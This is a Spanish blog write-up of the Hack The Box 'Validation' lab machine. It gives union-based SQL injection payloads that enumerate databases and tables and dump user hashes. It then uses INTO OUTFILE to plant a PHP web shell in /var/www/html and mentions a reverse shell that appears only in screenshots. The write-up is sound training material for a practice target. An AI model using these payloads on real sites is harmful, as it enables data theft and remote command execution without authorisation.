---
layout: single
title: WriteUp HTB - Máquina Validation
excerpt: "En este artículo, resolveremos la máquina Validation de la plataforma HTB."
date: 2025-04-12
classes: wide
header:
  teaser: /assets/images/htb/validation/logo.png
  teaser_home_page: true
categories:
  - HTB
  - WriteUp
  - eJPT
tags:
  - SQLI
  - Linux
  - Fácil
  - eJPT
  - MySQL

---
<p align="center">
  <img src="/assets/images/htb/validation/logo1.png" alt="Validation" width="2200">
</p>


---


## Explotación SQLI. 

Vemos en primer lugar que nos enfrentamos ante un panel donde no se acontece ningun login. Solo un post donde te creas un usuario al acceder.


<p align="center">
  <img src="/assets/images/htb/validation/web.png" alt="1" width="2200">
</p>

Probamos a alterar el campo de país con Burpsuite para ver si se acontece algún fallo en la web.

<p align="center">
  <img src="/assets/images/htb/validation/burp1.png" alt="2" width="2200">
</p>


<p align="center">
  <img src="/assets/images/htb/validation/burp2.png" alt="3" width="2200">
</p>

Como falla, podemos intuir que es vulnerable a SQLI, además vemos que se interpreta código php y que es un servidor apache alojado en la ruta del sistema /var/www/html.

Ahora probaremos a lanzar un:

- **Comando:**
  ```php
  ' order by 100-- -
  ```


para probar listar un ordenamiento de los datos basados en la columna número 100. En caso de responderte el mismo error en vez de alguno que te indique que se desconoce los datos de esa columna, podremos ir inyectando código con un 


- **Comando:**

```php
' union .... -- -

```

<p align="center">
  <img src="/assets/images/htb/validation/burp3.png" alt="4" width="2200">
</p>


<p align="center">
  <img src="/assets/images/htb/validation/burp4.png" alt="5" width="2200">
</p>

Probaremos a listar las base de datos existentes:

- **Comando:**
  ```php
  ' union SELECT database()-- -
  ```

<p align="center">
  <img src="/assets/images/htb/validation/burp5.png" alt="6" width="2200">
</p>


<p align="center">
  <img src="/assets/images/htb/validation/burp6.png" alt="7" width="2200">
</p>

Vemos que la bd se llama registration.

Para listar el nombre de todas las base de datos:

- **Comando:**
  ```php
  ' union SELECT schema_name from information_schema.schemata-- -
  ```


<p align="center">
  <img src="/assets/images/htb/validation/burp7.png" alt="8" width="2200">
</p>


<p align="center">
  <img src="/assets/images/htb/validation/burp8.png" alt="9" width="2200">
</p>

Para listar las tablas que contiene la base de datos registration probamos con:

- **Comando:**
  
  ' union SELECT table_name from information_schema.tables where table_schema="registration"-- -
  ```

<p align="center">
  <img src="/assets/images/htb/validation/burp9.png" alt="10" width="2200">
</p>


<p align="center">
  <img src="/assets/images/htb/validation/burp10.png" alt="11" width="2200">
</p>

Para listar las columnas de la tabla que queramos probamos con:

- **Comando:**
  ```php
  ' union SELECT column_name from information_schema.columns where table_schema="registration" and table_name="registration"-- -
  ```

<p align="center">
  <img src="/assets/images/htb/validation/burp11.png" alt="12" width="2200">
</p>


<p align="center">
  <img src="/assets/images/htb/validation/burp12.png" alt="13" width="2200">
</p>

Para listar el contenido de las dos entidades username y userhash, jugamos con group_concat para listar la info correspondiente de la tabla registration

- **Comando:**
  ```php
  ' union SELECT group_concat(username,0x3a,userhash) from registration-- -
  ```

0x3a = ;

<p align="center">
  <img src="/assets/images/htb/validation/burp13.png" alt="14" width="2200">
</p>





<p align="center">
  <img src="/assets/images/htb/validation/burp14.png" alt="16" width="2200">
</p>

No vemos información relevante ya que en los hashes no hay ninguna password por la naturaleza de la web, por lo que intentaremos interpretar código php interpretando el fichero en la ruta del sistema que la que suponemos que se almacena.

- **Comando:**
  ```php
  ' union SELECT "Esto es una prueba" into outfile "/var/www/html/prueba.txt"-- -
  ```

<p align="center">
  <img src="/assets/images/htb/validation/burp15.png" alt="17" width="2200">
</p>
Vemos como nos lo interpreta y se almacena el el sistema, por lo que intentaremos de mandar código php para poder ejecturar comandos


<p align="center">
  <img src="/assets/images/htb/validation/burp16.png" alt="18" width="2200">
</p>

- **Comando:**

```php
' union SELECT "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/prueba.php"-- -
```


<p align="center">
  <img src="/assets/images/htb/validation/burp17.png" alt="19" width="2200">
</p>


<p align="center">
  <img src="/assets/images/htb/validation/burp18.png" alt="20" width="2200">
</p>

Vemos que funciona desde la web, por lo que le pasaremos en oneliner para entablar una reverse shell a nuestro equipo encodeando a url la petición para que se interprete.

<p align="center">
  <img src="/assets/images/htb/validation/burp19.png" alt="21" width="2200">
</p>


<p align="center">
  <img src="/assets/images/htb/validation/burp20.png" alt="22" width="2200">
</p>


<p align="center">
  <img src="/assets/images/htb/validation/burp21.png" alt="23" width="2200">
</p>


---



